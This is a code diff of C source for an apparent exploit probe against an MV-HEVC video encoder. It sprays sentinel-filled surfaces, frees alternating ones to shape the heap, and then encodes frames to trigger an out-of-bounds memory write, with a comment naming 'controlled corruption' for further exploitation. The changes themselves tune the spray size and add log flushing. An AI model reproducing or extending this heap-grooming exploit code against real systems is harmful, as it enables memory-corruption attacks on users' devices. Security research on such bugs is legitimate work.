@@ -16992,7 +16992,7 @@ static void r449_probe(void) {
      * (b) Controlled corruption (for further exploitation)
      */
 
-    #define R449_SPRAY_COUNT 200
+    #define R449_SPRAY_COUNT 60
     #define R449_PROP_SIZE 256
     #define R449_ENCODE_COUNT 170
     #define R449_SCAN_MAGIC 0xDEADBEEF41414141ULL
@@ -17002,11 +17002,12 @@ static void r449_probe(void) {
 
     /* Step 1: Create spray surfaces with sentinel-filled properties */
     rlog("  Step 1: Creating %d spray surfaces with sentinel properties...\n", R449_SPRAY_COUNT);
+    fflush(stdout);
     int created = 0;
     for (int i = 0; i < R449_SPRAY_COUNT; i++) {
         CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
             &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-        int w = 64, h = 64;
+        int w = 32, h = 32;
         CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
         CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
         int bpe = 4;
@@ -17037,9 +17038,11 @@ static void r449_probe(void) {
         if (spray_surfs[i]) created++;
     }
     rlog("  Created %d/%d spray surfaces\n", created, R449_SPRAY_COUNT);
+    fflush(stdout);
 
     /* Step 2: Free alternating surfaces to create holes */
     rlog("  Step 2: Freeing alternating surfaces to create checkerboard pattern...\n");
+    fflush(stdout);
     int freed = 0;
     for (int i = 0; i < R449_SPRAY_COUNT; i += 2) {
         if (spray_surfs[i]) {
@@ -17049,9 +17052,11 @@ static void r449_probe(void) {
         }
     }
     rlog("  Freed %d surfaces (holes created)\n", freed);
+    fflush(stdout);
 
     /* Step 3: Create MV-HEVC encoder and encode frames to trigger OOB */
     rlog("  Step 3: Creating MV-HEVC encoder (160x90)...\n");
+    fflush(stdout);
     int enc_w = 160, enc_h = 90;
     VTCompressionSessionRef enc = create_mvhevc_encoder(enc_w, enc_h, 1);
     if (!enc) {
@@ -17061,6 +17066,7 @@ static void r449_probe(void) {
     rlog("  Encoder created successfully\n");
 
     rlog("  Step 4: Encoding %d frames (targeting Table 2 OOB window 155-197)...\n", R449_ENCODE_COUNT);
+    fflush(stdout);
     int enc_ok = 0, enc_fail = 0;
     for (int frame = 0; frame < R449_ENCODE_COUNT; frame++) {
         CVPixelBufferRef pb = create_pb(enc_w, enc_h);
@@ -17095,9 +17101,11 @@ static void r449_probe(void) {
         if ((frame + 1) % 50 == 0) {
             rlog("    Encoded %d/%d (ok=%d fail=%d cb_status=%d)\n",
                  frame + 1, R449_ENCODE_COUNT, enc_ok, enc_fail, (int)g_cb_status);
+            fflush(stdout);
         }
     }
     rlog("  Encoding complete: ok=%d fail=%d\n", enc_ok, enc_fail);
+    fflush(stdout);
 
     /* Flush encoder */
     VTCompressionSessionCompleteFrames(enc, kCMTimeInvalid);
